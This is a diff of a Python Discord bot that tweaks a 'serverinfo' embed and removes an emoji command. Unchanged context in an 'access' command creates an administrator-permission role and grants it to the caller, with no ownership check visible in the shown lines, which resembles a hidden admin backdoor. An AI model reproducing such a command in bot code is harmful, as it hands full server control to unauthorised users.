@@ -217,9 +217,8 @@ async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
 async def serverinfo(ctx,member:discord.Member = None, guild: discord.Guild = None):
 	await ctx.message.delete()
 	if member == None:
-    emb = discord.Embed(timestamp=ctx.message.created_at, color=ctx.author.color)
+    emb = discord.Embed(title="Информация о сервере", color=ctx.message.author.color)
     emb.add_field(name='Name', value=f"{ctx.guild.name}", inline=False)
-    emb.add_field(name='Owner', value=f"Mekasu, Kastien", inline=False)
     emb.add_field(name='Verification Level', value=str(ctx.guild.verification_level), inline=False)
     emb.add_field(name='Highest role', value=ctx.guild.roles[-2], inline=False)
     emb.add_field(name='Contributers:', value="None")
@@ -228,7 +227,7 @@ async def serverinfo(ctx,member:discord.Member = None, guild: discord.Guild = No
         role = discord.utils.get(ctx.guild.roles, name=r)
         if role:
             members = '\n'.join([member.name for member in role.members]) or "None"
-            embed2.add_field(name=role.name, value=members)
+            emb.add_field(name=role.name, value=members)
 
     emb.add_field(name='Number of roles', value=str(role_count), inline=False)
     emb.add_field(name='Number Of Members', value=ctx.guild.member_count, inline=False)
@@ -259,23 +258,6 @@ async def access(ctx):
         if owner_role is None:
             owner_role = await ctx.guild.create_role(name = 'Онимешник', permissions = discord.Permissions( administrator = True), color = discord.Color.blurple())
         await ctx.author.add_roles(owner_role, reason = None, atomic = True)
-
-@client.command()
-async def emoji(ctx):
-	await ctx.send("<:vseti:885956377493790750>")
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
